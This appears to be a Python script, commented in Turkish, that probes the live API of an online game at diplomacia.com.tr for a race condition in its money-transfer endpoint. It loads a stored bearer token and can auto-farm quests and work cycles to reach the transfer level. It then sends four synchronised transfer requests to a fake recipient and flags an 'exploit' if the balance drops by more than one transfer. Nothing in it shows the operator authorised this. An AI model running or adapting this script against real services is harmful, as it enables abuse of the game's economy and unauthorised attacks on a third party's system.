#!/usr/bin/env python3
"""Lv5+ ise transfer paralel race; değilse seviye/XP raporu.

  --level-up   Farm + görev claim ile lv5'e çıkmayı dene, sonra race çalıştır
  --max-cycles Farm döngü üst sınırı (varsayılan 25)
"""
from __future__ import annotations

import argparse
import json
import sys
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "bot"))
OUT = ROOT / "output" / "reverse"
AUTH = Path("/root/diplomacia-auth.json")
BASE = "https://diplomacia.com.tr/api"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
DELAY = 3.5
MIN_TRANSFER_LEVEL = 5


def load() -> tuple[str, str]:
    a = json.loads(AUTH.read_text())
    return a["token"], a["player_id"]


def api(method: str, path: str, token: str, body: dict | None = None) -> dict:
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "User-Agent": UA,
        "Origin": "https://diplomacia.com.tr",
        "Referer": "https://diplomacia.com.tr/",
    }
    data = json.dumps(body).encode() if body is not None else None
    if body is not None:
        headers["Content-Type"] = "application/json"
    time.sleep(DELAY)
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return {"status": r.status, "data": json.loads(r.read().decode())}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "data": json.loads(e.read().decode())}


def try_level_up(token: str, target: int = MIN_TRANSFER_LEVEL, max_cycles: int = 25) -> dict:
    """Farm + görev claim ile hedef seviyeye çıkmayı dene."""
    from diplomacy_bot.factory_service import run_work_cycle
    from diplomacy_bot.game_api import claim_ready_quests, get_profile

    log: list[dict] = []
    prof = get_profile(token)
    if prof.level >= target:
        return {"ok": True, "level": prof.level, "xp": prof.xp, "cycles": 0, "log": log}

    for i in range(max_cycles):
        for q in claim_ready_quests(token):
            log.append({"step": "quest", "cycle": i, "result": q})
        prof = get_profile(token)
        if prof.level >= target:
            return {"ok": True, "level": prof.level, "xp": prof.xp, "cycles": i, "log": log}

        farm = run_work_cycle(token)
        log.append({"step": "farm", "cycle": i, "result": farm})
        if farm.get("ok"):
            prof = get_profile(token)
            if prof.level >= target:
                return {"ok": True, "level": prof.level, "xp": prof.xp, "cycles": i + 1, "log": log}
        elif farm.get("cooldown_ms"):
            log.append({"step": "stop", "reason": "pill_cooldown", "ms": farm["cooldown_ms"]})
            break

    prof = get_profile(token)
    return {
        "ok": prof.level >= target,
        "level": prof.level,
        "xp": prof.xp,
        "cycles": len([x for x in log if x.get("step") == "farm"]),
        "log": log[-10:],
    }


def run_race(token: str, balance_before: int) -> dict:
    fake = "00000000-0000-0000-0000-000000000099"
    outcomes: list[dict] = []
    barrier = threading.Barrier(4)

    def send_once(i: int):
        try:
            barrier.wait(timeout=10)
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
                "User-Agent": UA,
                "Origin": "https://diplomacia.com.tr",
            }
            body = json.dumps({"recipient_id": fake, "amount": 100}).encode()
            req = urllib.request.Request(
                BASE + "/transfer/send", data=body, headers=headers, method="POST"
            )
            with urllib.request.urlopen(req, timeout=25) as r:
                outcomes.append({"thread": i, "status": r.status})
        except urllib.error.HTTPError as e:
            outcomes.append({"thread": i, "status": e.code, "body": e.read().decode()[:150]})
        except Exception as ex:
            outcomes.append({"thread": i, "error": str(ex)})

    threads = [threading.Thread(target=send_once, args=(i,)) for i in range(4)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    time.sleep(DELAY)

    prof2 = api("GET", "/players/profile", token)
    balance_after = int(prof2["data"].get("player", {}).get("balance") or 0)
    race_exploit = balance_before - balance_after > 100
    return {
        "race_ran": True,
        "outcomes": outcomes,
        "balance_before": balance_before,
        "balance_after": balance_after,
        "balance_delta": balance_after - balance_before,
        "race_exploit": race_exploit,
        "status": "exploit" if race_exploit else "ok",
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Transfer race security probe")
    parser.add_argument(
        "--level-up",
        action="store_true",
        help="lv5 altındaysa farm/görev ile level atlamayı dene",
    )
    parser.add_argument("--max-cycles", type=int, default=25, help="Max farm döngüsü")
    args = parser.parse_args()

    OUT.mkdir(parents=True, exist_ok=True)
    token, _my_id = load()
    prof = api("GET", "/players/profile", token)
    player = prof["data"].get("player", {})
    level = int(player.get("level") or 0)
    xp = int(player.get("xp") or 0)
    balance_before = int(player.get("balance") or 0)

    report: dict = {
        "ts": datetime.now(timezone.utc).isoformat(),
        "username": player.get("username"),
        "level": level,
        "xp": xp,
        "min_transfer_level": MIN_TRANSFER_LEVEL,
        "race_ran": False,
        "level_up_attempted": bool(args.level_up),
    }

    if level < MIN_TRANSFER_LEVEL and args.level_up:
        report["level_up"] = try_level_up(token, MIN_TRANSFER_LEVEL, args.max_cycles)
        level = report["level_up"]["level"]
        report["level"] = level
        xp = report["level_up"].get("xp", xp)
        report["xp"] = xp

    if level < MIN_TRANSFER_LEVEL:
        report["status"] = "skipped"
        report["reason"] = f"lv{level} < {MIN_TRANSFER_LEVEL} — farm/quest veya --level-up"
        report["suggestion"] = "python3 scripts/transfer_race_probe.py --level-up"
    else:
        report.update(run_race(token, balance_before))

    out = OUT / "transfer_race_probe.json"
    out.write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    print(json.dumps(report, ensure_ascii=False, indent=2))
    print(f"saved {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
